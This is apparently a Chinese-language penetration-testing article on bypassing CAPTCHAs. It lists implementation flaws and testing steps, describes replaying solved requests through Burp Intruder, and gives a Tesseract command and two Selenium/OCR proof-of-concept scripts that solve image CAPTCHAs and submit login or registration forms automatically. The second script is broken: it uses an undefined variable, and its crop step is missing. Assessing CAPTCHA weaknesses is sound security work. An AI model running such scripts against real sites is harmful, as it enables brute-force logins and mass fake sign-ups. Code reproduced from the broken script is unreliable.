## 绕过 CAPTCHA

CAPTCHA（全自动区分计算机和人类的公开图灵测试）的主要目的是区分人类和机器人。随着时间的推移，由于光学字符识别（OCR）软件和机器学习技术的进步，CAPTCHA 已从纯文本演变为包含图片和音频挑战。

CAPTCHA 的基本原理植根于挑战-响应机制，用户面临诸如识别图像中的物体或转录扭曲文本的挑战，必须正确响应以证明其人类身份。

CAPTCHA 是防止密码猜测攻击或暴力破解攻击最有效的方法之一。常见的实现策略是，在连续多次登录失败后，要求用户解决 CAPTCHA 才能继续，从而阻止自动化攻击并增加额外安全层。

CAPTCHA 可能会阻碍暴力破解攻击，但它们自身也可能存在弱点，不应取代锁定机制。如果实现不当，CAPTCHA 机制可能被绕过。CAPTCHA 的缺陷包括：

1. 挑战过于简单，例如算术题或有限的题目集。
2. CAPTCHA 检查 HTTP 响应码而非响应成功状态。
3. CAPTCHA 服务端逻辑默认认为验证通过。
4. CAPTCHA 挑战结果从未在服务端验证。
5. CAPTCHA 输入字段或参数被手动处理，且验证或转义不当。
6. 单个已解决的 CAPTCHA 可被多次重复使用。

评估 CAPTCHA 有效性的方法：

1. 评估 CAPTCHA 挑战，并尝试根据难度自动化解决方案。
2. 尝试通过正常 UI 机制在不解决 CAPTCHA 的情况下提交请求。
3. 尝试故意使 CAPTCHA 挑战失败来提交请求。
4. 在使用测试代理（请求直接提交到服务端）的情况下，尝试在不解决 CAPTCHA 的情况下提交请求（假设客户端代码可能传递了某些默认值）。
5. 尝试对 CAPTCHA 数据输入点（如果存在）使用常见注入载荷或特殊字符序列进行模糊测试。
6. 检查 CAPTCHA 的解决方案是否可能为图像的 alt 文本、文件名或关联隐藏字段中的值。
7. 尝试重新提交先前已知的正确响应。
8. 检查清除 Cookie 是否会绕过 CAPTCHA（例如，仅在多次失败后才显示 CAPTCHA）。
9. 如果 CAPTCHA 是多步骤流程的一部分，尝试直接访问或完成 CAPTCHA 之后的步骤（例如，如果 CAPTCHA 是登录流程的第一步，尝试直接提交第二步[用户名和密码]）。
10. 检查是否存在未强制实施 CAPTCHA 的替代方法，例如用于移动应用访问的 API 端点。

对每个可能需要锁定机制的功能重复此过程。

关于绕过 CAPTCHA，细节大多决定成败。由于 CAPTCHA 的实现各不相同，我们来看看实际中常见的规避技术。

### 重放攻击

在最近的一次渗透测试中，应用程序实现了 CAPTCHA，但发现容易受到重放攻击。本质上，通过重放先前捕获的请求，恶意用户可以绕过 CAPTCHA 的保护，使用自动化脚本发送多个请求。此漏洞存在的原因是 CAPTCHA 验证未与会话或令牌唯一绑定。换言之，一旦攻击者捕获了有效的 CAPTCHA 解决方案，它可以无限重用，无需为后续每个请求解决新的 CAPTCHA 挑战。

重现漏洞的步骤如下：

1. 发起新请求，确保验证 CAPTCHA。  
2. 使用代理工具（如 Burp Suite）捕获请求，并将其转发至 Intruder。  
3. 多次重发请求，注意应用程序始终接受先前输入的 CAPTCHA 值，而不是要求新的 CAPTCHA。

以下是可以用来测试 CAPTCHA 重放攻击的类似技术：

- **空值方法**：尝试发送空的 CAPTCHA 参数。
- **更改请求类型**：尝试将请求类型从 GET 改为 POST 或反之，从请求中省略 CAPTCHA。
- **更改请求体**：尝试将请求体从 POST 表单改为 JSON 或反之。

#### OCR 引擎绕过

在另一次评估中，注册页面上存在 CAPTCHA。检查后发现文本通过 OCR 引擎很容易识别。最初，使用 Google 的 Tesseract OCR 引擎验证了此行为。通过多次刷新页面生成 CAPTCHA，并使用相同方法成功转换为文本。

重现此行为的步骤如下：

1. 从注册网页下载 CAPTCHA。

2. 接下来，使用 Google Tesseract OCR 引擎的封装，将包含 CAPTCHA 值的 png 图像转换为文本。使用以下命令：

**命令**
```bash
tesseract -l eng captcha.png captcha; echo; echo "Captcha value is"; cat captcha.txt
```

每次生成新的 CAPTCHA 时，都需要下载、通过 Google Tesseract OCR 引擎处理，然后在发送前输入 HTTP 请求。为了大规模自动化和复制此过程，使用 Selenium 开发了 Python 脚本。该脚本能够提取 CAPTCHA 值并将其注入原始请求，从而有效绕过 CAPTCHA 安全机制。

**CAPTCHA 绕过 POC**
```python
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
import warnings
import time
import base64
from PIL import Image
from io import BytesIO
from selenium.webdriver.common.keys import Keys
import urllib.request
from PIL import Image
import pytesseract
import argparse
import cv2
import os

def captcha_bypass():
    warnings.filterwarnings("ignore", category=DeprecationWarning)
    options = Options()
    options.add_experimental_option('excludeSwitches', ['enable-logging'])
    # options.headless = True
    options.add_argument("Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36")
    driver = webdriver.Chrome('chromedriver', chrome_options=options)
    driver.get("redacted")
    html = driver.page_source
    print("[*] Saving Captcha Image")
    img = driver.find_element_by_xpath('/html/body/form/div[2]/div/div/div[5]/div[1]/div[1]/div/img')
    src = img.get_attribute('src')
    urllib.request.urlretrieve(src, "captcha.png")
    print("[*] Converting Captcha image into text . . . . . .")
    # load the image and convert it to grayscale
    image = cv2.imread("captcha.png")
    gray = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY)
    # write the grayscale image to disk as a temporary file so we can
    # apply OCR to it
    filename = "{}.png".format(os.getpid())
    cv2.imwrite(filename, gray)
    # load the image as a PIL/Pillow image, apply OCR, and then delete
    # the temporary file
    text = pytesseract.image_to_string(Image.open(filename))
    os.remove(filename)
    print("Captcha Text is: "+ text)
    print("[*] submitting the form")
    driver.find_element_by_id("txt_SubmitCaptchaInput").send_keys(text)
    driver.find_element_by_id("emailAddress").send_keys("user@test.com")
    driver.find_element_by_id("validateBtn").click()
    print("\n\t\t-CAPTCHA BYPASS ")

for _ in range(3):
    time.sleep(4)
    captcha_bypass()
```

### 使用 OCR 绕过动态 CAPTCHA 生成

在另一次评估中，观察到类似的 CAPTCHA。通过 Google Tesseract OCR 引擎，能够将图像转换为文本。但存在一个问题：CAPTCHA 图像无法直接下载，因为应用程序在每个请求中动态生成新图像。换言之，该网站采用动态 CAPTCHA 生成，不断创建新图像以阻止传统下载方法。

为了解决此挑战，使用 Selenium 设计了一个方案。该过程包括拍摄全页截图，然后从截图中精确裁剪 CAPTCHA 区域，随后通过 OCR 处理图像。

**步骤 1：捕获截图并裁剪 CAPTCHA**

提供的 Python 代码使用 Selenium WebDriver 打开注册页面，然后捕获全页截图，并精确选择包含 CAPTCHA 的区域进行裁剪。裁剪后的 CAPTCHA 图像单独保存。

**步骤 2：处理 CAPTCHA 图像**

下一步是使用 Tesseract OCR 库（Pytesseract）处理裁剪的 CAPTCHA 图像，从中提取文本。提取的 CAPTCHA 文本随后用于填写网页上的相关表单字段。最后，脚本提交带有 CAPTCHA 文本的表单，从而绕过 CAPTCHA 保护，无需人工干预即可注册用户。

**CAPTCHA 绕过 POC**
```python
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.keys import Keys
from fileinput import filename
from PIL import Image
from io import BytesIO
import cv2, time, warnings, pytesseract

def captcha_bypass():
    warnings.filterwarnings("ignore", category=DeprecationWarning)
    options = Options()
    options.add_experimental_option('excludeSwitches', ['enable-logging'])
    options.headless = True
    options.add_argument("Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36")
    driver = webdriver.Chrome('chromedriver', chrome_options=options)
    driver.get("https://redacted/user-register-and-login/")
    time.sleep(2)
    filename = "captcha.png"
    driver.save_screenshot(filename)
    img = Image.open(filename)
    left = 61
    top = 410
    right = 200
    bottom = 492

    img_res.save('crop.png')
    img_res.show()
    driver.find_element_by_id("femanager_field_name").send_keys("CAPTCHA BYPASS")
    driver.find_element_by_id("femanager_field_username").send_keys("abc@tmgm.com")
    driver.find_element_by_id("femanager_field_company").send_keys("TMGM")
    driver.find_element_by_id("femanager_field_password").send_keys("ABC@1234567")
    driver.find_element_by_id("femanager_field_password_repeat").send_keys("ABC@1234567")
    text = pytesseract.image_to_string(Image.open("crop.png"))
    driver.find_element_by_id("femanager_field_captcha").send_keys(text)
    driver.find_element_by_id("femanager_field_submit").click()
    print("\n\t\t- CAPTCHA BYPASS ")

captcha_bypass()
```
